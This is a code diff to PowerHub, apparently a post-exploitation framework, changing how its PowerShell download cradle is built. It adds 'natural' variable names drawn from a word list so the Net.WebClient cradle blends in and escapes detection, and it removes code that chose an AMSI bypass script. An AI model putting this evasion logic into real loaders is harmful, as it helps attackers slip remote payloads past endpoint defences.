@@ -16,6 +16,7 @@ from powerhub.env import powerhub_app as ph_app
 log = logging.getLogger(__name__)
 
 symbol_list = {None: None}
+VARLIST = []
 
 callback_urls = {
     'http': 'http://%s:%d/%s' % (
@@ -61,7 +62,8 @@ def build_crade_https(get_args):
 
 def build_cradle_webclient(get_args, key):
     result = ''
-    web_client = symbol_name('web_client')
+    natural = (get_args['Natural'] == 'true')
+    web_client = symbol_name('web_client', natural=natural, refresh=True)
 
     if get_args['Transport'].startswith('http'):
         result += "$%(web_client)s=New-Object Net.WebClient;"
@@ -79,6 +81,9 @@ def build_cradle_webclient(get_args, key):
 
         if get_args['Minimal'] == 'true':
             query += "&m=t"
+
+        if natural:
+            query += "&n=t"
 
         query = encrypt_aes(query, key)
         # Make b64 encoding urlsafe
@@ -99,7 +104,8 @@ def build_cradle(get_args, key):
     log.debug("GET arguments: %s" % get_args)
 
     result = ""
-    key_var = symbol_name('global_key')
+    natural = (get_args['Natural'] == 'true')
+    key_var = symbol_name('global_key', natural=natural)
 
     result += build_crade_https(get_args)
 
@@ -134,14 +140,44 @@ def build_cradle(get_args, key):
     return result
 
 
-def symbol_name(name):
+def symbol_name(name, natural=False, refresh=False):
+    if refresh and name in symbol_list:
+        del symbol_list[name]
+
     if name not in symbol_list:
         if ph_app.args.DEBUG:
             # In debug mode, don't obfuscate
             symbol_list[name] = name
         else:
-            symbol_list[name] = choose_obfuscated_name()
+            if natural:
+                symbol_list[name] = choose_natural_name()
+            else:
+                symbol_list[name] = choose_random_name()
     return symbol_list[name]
+
+
+def choose_natural_name():
+    if not VARLIST:
+        with open(os.path.join(BASE_DIR, 'variables.txt'), 'r') as fp:
+            for line in fp:
+                if not line.startswith('#'):
+                    VARLIST.append(line.strip())
+
+    result = None
+    while not result or result in list(symbol_list.values()):
+        result = random.choice(VARLIST)
+
+    return result
+
+
+def choose_random_name():
+    result = None
+    length = random.choice(range(4, 8))
+    while not result or result in list(symbol_list.values()):
+        result = ''.join([random.choice(string.ascii_lowercase)
+                          for i in range(length)])
+        result = random.choice(string.ascii_uppercase) + result
+    return result
 
 
 def debug(msg, dbg=False):
@@ -151,36 +187,10 @@ def debug(msg, dbg=False):
     return ""
 
 
-def choose_obfuscated_name():
-    # TODO choose better names
-    # the names should not contain too much entropy, or it will be
-    # detectable. they should also not be too common or we will risk
-    # collisions. they should just blend in perfectly.
-    result = None
-    length = random.choice(range(4, 8))
-    while not result and result in list(symbol_list.values()):
-        result = ''.join([random.choice(string.ascii_lowercase)
-                          for i in range(length)])
-        result = random.choice(string.ascii_uppercase) + result
-    return result
-
-
 # TODO add jinja include_randomize_whitespace
 # TODO add jinja powershell decoys
 
-def get_stage(key, amsi_bypass='reflection', jinja_context={}, stage3_files=[], stage3_strings=[]):
-    if amsi_bypass:
-        assert '/' not in amsi_bypass
-        amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')
-    else:
-        amsi_bypass = ''
-
-    context = {
-        'symbol_name': symbol_name,
-        'key': key,
-        'amsibypass': amsi_bypass,
-    }
-    context.update(jinja_context)
+def get_stage(key, context={}, stage3_files=[], stage3_strings=[]):
 
     env = Environment(loader=FileSystemLoader(
         os.path.join(BASE_DIR, 'templates')
